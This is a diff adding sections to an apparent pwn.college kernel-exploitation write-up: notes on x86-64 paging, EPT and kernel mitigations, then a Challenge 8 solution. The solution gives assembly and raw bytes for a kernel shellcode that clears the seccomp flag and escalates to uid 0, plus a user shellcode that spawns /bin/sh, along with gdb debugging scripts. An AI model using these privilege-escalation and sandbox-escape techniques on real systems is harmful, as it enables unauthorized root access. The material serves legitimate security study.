@@ -66,9 +66,56 @@ How can we figure out these symbols addresses? Usually there's KASLR, so they wo
 Recall each process has the kernel code mapped in the "upper half" of memory. \
 The kernel maintains mapping between process VA, and the actual addresses they correspond to in PA.
 
-2:24
+Every process have its own page table, accssed by `cr3`. Nowadays, it is actually a multi-level paging structure, of 4 levels. \
+Each layer contains 512 entries, and therefore takes only `512 * 8 = 4 KB` of memory. For example, the page directory (level 2)  contains 512 pgdir entries (PDEs), each mapping a page table, where each contains 512 PTEs, each referring to a page of `0x1000` bytes. This means that the 2-level pagins system supports up to `512 * 512 * 0x1000 = 1 GB` of VA, for each process! \
+However, notice the overhead isn't small - `0x1000` bytes for the PD, and `0x1000` for each mapped `2 MB` of VA (only mapped VA allocates new PT, therefore not all maximum of 512 PTs are allocated, which is a great lazyness optimization). Theres a cool optimization - large pages, where by setting a special flag, the PDE can refer to physical address, just as a PTE, but this address is a page of `2 MB` in size. \
+The third layer is called page directory page table, PDP, which contains 512 pointers to PDs, meaning - total of `512 GB` VA addressing is now possible! \
+Moreover, a similar overhead reduction optimization now offers PDP to have an entry that directly refers to `1 GB` of memory "giga-page". \
+The fourth layer is called page map lever 4, aka PML 4, which contains 512 PDPs, addressing total of 256 TB of RAM.  
 
+A 64-bit virtual address is actually made of 5 different components - the 12 LSbs are the offset within a page. The 9 LSbs prior to it are the index within the PT that refers to our PTE (corresponds to the physical page address). Since there are 512 entries, 9 bits are exactly what we need to refer to that index. In a similar manner, the next 9 LSbs are the index within the PD referring to the PDE (corresponds to the physical address of the page table), and so on. \
+This means a total of `4 * 9 + 12 = 48 bits` are being used within 64-bit address. The rest of the bits are sign extension. Notice that different architectures, such as ARM, uses memory tagging within the leftover `16` bits. This also means that there are actually **5 dereferences** for each memory dereference! \
+Since each process has its own PML4 physical address, located within `cr3`, swapped upon every context switch by the kernel, hence accessible only in CPL 0.
 
+For virtual machines isolation, we use an **extended page table**, for EVERY different VM. Recall the guest kernel "thinks" it access physical addresses, but these are actually guest-physical addresses. We need a translation mechanism from guest-physical to host-physical addresses, for EVERY translated layer. This two dimensional grid means there are actually `25` translation stages! \
+For example, when the guest tries to access VA, it uses its `cr3` register, which (along with `EPTP` index stored within the hypervisor, to allow multiple VMs) contains the guest-physical address of PML4, meaning - `EPT PML4`. This is actually a virtual address, hence goes by the EPT translation layer 4 times, in order to resolve the `PML4` physical address within the host. Notice the guest doesn't knows nor cares about this host physical address. By its means, accessing `cr3` register value, yield a valid guest physical address (although it is actually a virtualized address, managed by the EPT). \
+Notice all lookups are being performed by the hardware - MMU. Theres also an optimization, TLB, which contains direct cache mapping between "hot" virtual addresses directly to their physical addresses. \
+For other architectures - ARM's `cr3` equivalent is `TTBR0` for userspace, and `TTBR1` for kernelspace - which is a cool distinguishment. 
+
+For old kernels, `root` user could access physical memory via `/dev/mem`. This means that we **could** access physical memory having `uid 0, CPL3`! \
+Nowadays, accessing physical memory can only be done within the kernel, `CPL 0` - not even as root. \
+For convenient access, physical memory is mapped contiguously in the kernel's VA. Two important macros are `phys_to_virt, virt_to_phys` - which converts kernel VA addrs to physical. We can easily RE these macros (simple math and bit operations), implementing our own equivalents within a shellcode. 
+
+### Kernel Mitigations
+
+Some mitigations are familiar:
+
+1. Kstack canaries
+
+2. KASLR (randomized upon boot)
+
+3. NX for Kstack, Kheap
+
+And few extra:
+
+1. Function granular KASLR - shuffle functions around
+
+2. SMEP - prevents kernelspace from executing userspace memory, at all - ever!
+
+3. SMAP - prevents even accessing userspace memory. The `AC` flag in `RFLAGS` register must be set to do so. `stac, clac` are CPL 0 instructions that handles this bit. For example, `copy_from_user` must set this bit, in order to access userspace memory (for example, must be done to resolve `path` argument for `open`).
+
+A possible workaround is using `run_cmd(char *cmd)` - run a command in userspace, as root. 
+
+### Seccomp Bypass
+
+Implemented in the kernel. In particular, within `task_struct` there's `thread_info.flags`. The flag `TIF_SECCOMP` enables seccomp enforcement. Within Linux's syscall entry, there's a check via `secure_computing`, which checks if a particular syscall is eligible for execution. \
+By turning off `TIF_SECCOMP`:
+
+```c
+current->thread_info.flags &= ~_TIF_SECCOMP;
+```
+
+We can escape seccomp for the current thread. In order to resolve `current` task struct, we can simply refer to `gs` register. 
 
 ### Kernel Shellcode
 
@@ -461,9 +508,135 @@ cleanup:
 
 ## Challenge 8
 
+We're given a userspace binary, which opens the proc entry of `pwncollege`, and reads arbtirary `0x1000` bytes into a userspace buffer. Notice this is a `suid` binary, and the proc entry is only eligable for root access. Hence, we won't be able to forge our own userspace program. \
+Afterwards, seccomp filter is being added, only allowing the `write` syscall. The procfs file have a write handler, which reads a shellcode and executes it. \
+My kernel shellcode has 2 stages:
+
+1. Clear `TIF_SECCOMP` bit
+
+2. Elevate `uid` to `0`
+
+My user shellcode has 2 stages:
+
+1. Write bytes into the procfs fd, triggering `device_write` within the kernel
+
+2. Run `execve("/bin/sh", {"/bin/sh", 0}, 0)`
+
+In order to mimic the commercial behavior of kernel's clearing `TIF_SECCOMP`, I've compiled a simple kernel module that only does `current->thread_info.flags &= ~_TIF_SECCOMP`. By RE it, I've figured this operation is actually resolved to (on my platform):
+
+```c
+mov rbx, QWORD PTR gs:0x0
+and QWORD PTR [rbx],0xfffffffffffffeff
+```
+
+Notice that because of relocations, the offset of `gs:0x0` is actually invalid. **We have to load the module, and inspect the exact patched offset!** Indeed, by doing so, we can see the real offset is actually `0x15d00`:
+
+```bash
+0xffffffffc00050dd:  mov    rbx,QWORD PTR gs:0x15d00
+```
+
+Alternatively, [this great post][kernel-gs] explains how we can retrieve this offset, by simple `p/x &current_task`. In particular, `current` is actually saved within a special per-cpu region, which can be found via `p/x __per_cpu_offset[i]`, where `i` is the CPU number. \
+Hence, the above snippet would be the kernel shellcode's start. \
+Regarding the userspace shellcode, thanksfully the procfs entry is already opened at `fd = 3`. Hence, we would write into it our code, which is a simple wrapper that only writes data into `fd = 3`. A cool note, is that we can write the usermode shellcode as PIC - such that it won't rely on the userspace address in which it was loaded. \
+Our final shellcode, which we would send to the program, would look as follows:
+
+```c
+user_shellcode:
+mov rdi, 3
+lea rsi, [rip + kernel_shellcode]
+mov rdx, 0x1000
+mov rax, 1
+syscall
+
+chmod_flag:
+mov rbx, 0x67616c662f
+push rbx
+push rsp
+pop rdi
+mov rsi, 0xffff
+mov rax, 90
+syscall
+
+run_bin_sh:
+xor eax, eax
+mov rbx, 0xFF978CD091969DD1
+neg rbx
+push rax
+push rbx
+push rsp
+pop rdi
+cdq
+push rdx
+push rdi
+mov rsi, rsp
+push rsp
+pop rsi
+mov al, 0x3b
+syscall
+
+kernel_shellcode:
+push rbx
+push rbp
+mov rbp, rsp
+
+disable_seccomp:
+mov rbx, QWORD PTR gs:0x15d00
+and QWORD PTR [rbx],0xfffffffffffffeff
+
+set_uid_0:
+xor rdi, rdi
+mov rbx, 0xffffffff81089660
+call rbx
+mov rdi, rax
+mov rbx, 0xffffffff81089310
+call rbx
+
+mov rsp, rbp
+pop rbp
+pop rbx
+ret
+```
+
+Interestingly, while I DID popped a privileged shell, because `sh` actually invokes a new child process for every dispatched command, it inherits seccomp flag - and the child commands were all blocked by the seccomp filter (as its seccomp bit is enabled). \
+I've just added `chmod` prior to executing the shellcode, to prove I've indeed gained root privileges. 
+
+Regarding debugging, I've used different setup for userspace debugging and kernelspace debugging. For userspace, I've used a local `gdb` inside the VM. `pwndbg` isn't supported well inside the VM, and nested tmux sessions in particular. Therefore, in order to conviniently send input to it, I've wrote raw gdb scripts:
+
+```python
+user_shellcode = b"\x48\xC7\xC7\x03\x00\x00\x00\x48\x8D\x35\x4C\x00\x00\x00\x48\xC7\xC2\x00\x10\x00\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05\x48\xBB\x2F\x66\x6C\x61\x67\x00\x00\x00\x53\x54\x5F\x48\xC7\xC6\xFF\xFF\x00\x00\x48\xC7\xC0\x5A\x00\x00\x00\x0F\x05\x31\xC0\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xDB\x50\x53\x54\x5F\x99\x52\x57\x48\x89\xE6\x54\x5E\xB0\x3B\x0F\x05\x53\x55\x48\x89\xE5\x65\x48\x8B\x1C\x25\x00\x5D\x01\x00\x48\x81\x23\xFF\xFE\xFF\xFF\x48\x31\xFF\x48\xC7\xC3\x60\x96\x08\x81\xFF\xD3\x48\x89\xC7\x48\xC7\xC3\x10\x93\x08\x81\xFF\xD3\x48\x89\xEC\x5D\x5B\xC3"
+    
+with open('gdb_input.bin', 'wb') as f:
+    f.write(user_shellcode)
+```
+
+```bash
+### gdb_debug.gdb ###
+break seccomp_init
+commands
+    print "in seccomp_init"
+    b *0x0000000031337000
+    commands
+        print "running shellcode.."
+    end
+
+end
+
+r < /home/hacker/gdb_input.bin
+c
+
+### run_gdb.sh ###
+#!/bin/bash
+
+gdb -x /home/hacker/gdb_debug.gdb /challenge/babykernel_level8.0
+```
+
+## Challenge 9
+
+
 
 
 [pwnkernel]: https://github.com/pwncollege/pwnkernel/tree/main
 [setup1]: https://scoding.de/linux-kernel-exploitation-environment
 [setup2]: https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/
 [setup3]: https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.html
+[kernel-gs]: https://slavaim.blogspot.com/2017/09/linux-kernel-debugging-with-gdb-getting.html
